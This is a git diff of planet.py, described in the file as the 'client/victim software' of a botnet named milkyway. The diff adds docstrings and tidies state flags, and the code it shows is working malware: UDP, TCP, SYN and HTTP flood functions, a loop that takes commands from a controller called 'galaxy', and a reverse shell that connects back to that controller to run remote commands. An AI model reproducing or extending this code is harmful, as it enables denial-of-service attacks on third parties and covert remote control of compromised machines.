@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 
+"""planet.py: The milkyway client/victim software."""
+
 # import libraries
 import multiprocessing
 import os
@@ -26,12 +28,13 @@ else:
 
 # functions
 def ddos_udp(target_ip, target_port):
+    """Attempt a DDoS attack on a remote host by spamming large packets of data (UDP ONLY)."""
     global requests_sent
     while planet_attacking:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect((str(target_ip), int(target_port)))
-            s.sendto(os.urandom(1024), (str(target_ip), int(target_port)))
+            s.sendto(random._urandom(10240), (str(target_ip), int(target_port)))
             s.close()
             requests_sent += 1
         except IOError:
@@ -39,6 +42,7 @@ def ddos_udp(target_ip, target_port):
 
 
 def ddos_tcp(target_ip, target_port):
+    """Attempt a DDoS attack on a remote host by spamming large packets of data (TCP ONLY)."""
     global requests_sent
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while planet_attacking:
@@ -54,6 +58,7 @@ def ddos_tcp(target_ip, target_port):
 
 
 def ddos_syn(target_ip, target_port):
+    """Attempt a DDoS attack on a remote host by spamming connections and disconnections."""
     global requests_sent
     while planet_attacking:
         try:
@@ -68,6 +73,7 @@ def ddos_syn(target_ip, target_port):
 
 
 def ddos_http(target_ip, target_port):
+    """Attempt a DDoS attack on a remote host by spamming HTTP GET requests."""
     global requests_sent
     src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
     while planet_attacking:
@@ -89,19 +95,20 @@ def ddos_http(target_ip, target_port):
 
 
 def exit_handler(*args):
-    global planet_online, planet_shutting_down, planet_attacking, planet_shelled
+    """Ensure a smooth and safe exit."""
+    global planet_online, planet_shutting_down, planet_attacking
     planet_shutting_down = True
     if planet_online:
         planet_socket.send(f"planet ID: {planet_id} offline".encode())
     planet_online = False
     planet_attacking = False
-    planet_shelled = False
     planet_socket.close()
     print("Exiting...")
     os._exit(0)
 
 
 def connect_to_galaxy():
+    """Connect to galaxy."""
     global planet_socket, planet_online
     while not planet_online:
         try:
@@ -116,7 +123,7 @@ def connect_to_galaxy():
 
 
 def shell(shell_buf_size):
-    global planet_shelled
+    """Process incoming reverse shell commands from galaxy."""
     shell_socket = socket.socket()
     shell_socket.connect((galaxy_ip, shell_port))
     cwd = os.getcwd()
@@ -163,12 +170,12 @@ def shell(shell_buf_size):
         shell_socket.send(message.encode())
     if planet_shutting_down:
         shell_socket.send("shutting down".encode())
-    planet_shelled = False
     shell_socket.close()
 
 
 def connection_handler():
-    global planet_online, planet_id, planet_shelled, planet_attacking
+    """Handle commands coming from galaxy, and keep planet connected to galaxy."""
+    global planet_online, planet_id, planet_attacking
     while not planet_shutting_down:
         while planet_online:
             try:
@@ -213,7 +220,6 @@ def connection_handler():
                     print(f"Recieved planet ID: {planet_id}")
                     print(data)
                 elif "shellcmd start bufsize " in data:
-                    planet_shelled = True
                     planet_socket.send(f"planet ID: {planet_id} shelled".encode())
                     shell(int(data.replace("shellcmd start bufsize ", "").strip()))
             except Exception:
@@ -224,10 +230,10 @@ def connection_handler():
                 print(e)
             time.sleep(1)
         planet_attacking = False
-        planet_shelled = False
 
 
 def ddos_check_reqs():
+    """Calculate DDoS requests per second."""
     while planet_attacking:
         old_requests_sent = requests_sent
         time.sleep(5)
@@ -239,19 +245,18 @@ def ddos_check_reqs():
 # exit handler
 signal(SIGINT, exit_handler)
 
+
 # variables
 galaxy_ip = "192.168.1.2"
 galaxy_port = 9999
 shell_port = 10000
 planet_threads = multiprocessing.cpu_count()
 planet_id = ""
-planet_shelled = False
 planet_attacking = False
 planet_online = False
 planet_shutting_down = False
-attack_socket = ""
-tcp_ddos_packet = ""
 requests_sent = 0
+
 
 # connect to galaxy
 connect_to_galaxy()
